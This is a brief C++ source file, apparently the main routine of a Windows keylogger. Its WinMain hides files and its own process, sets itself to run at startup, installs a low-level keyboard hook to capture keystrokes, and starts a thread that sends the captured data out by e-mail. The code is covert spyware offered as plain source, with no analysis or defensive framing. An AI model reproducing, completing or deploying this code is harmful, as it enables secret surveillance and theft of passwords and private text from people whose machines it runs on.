
#include "header.h"

HHOOK keyboardHook;

int WINAPI WinMain(HINSTANCE hInstance,
HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (Process::GetProcessesByName(gcnew String(nameProg))->Length > 1) return 0; //check for runed the same app
	hideFiles();
	getCompName();
	toPostAnother(lpCmdLine);
	SelfAutorun();
	HANDLE hHideP = (HANDLE)_beginthreadex(NULL, 0, &hideProc, NULL, 0, NULL);
	HANDLE hSendM = (HANDLE)_beginthreadex(NULL, 0, &sendFileFun, NULL, 0, NULL); //run sending e-mail thread
	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hInstance, 0); //hooks keyboard
	msgLoop(); //stops from closing      
	stopThreadSendMail = false;//for stoping sending e-mail
	stopThreadHideProc = false;
	UnhookWindowsHookEx(keyboardHook); //unhooks
	return 0; //Never run	
}
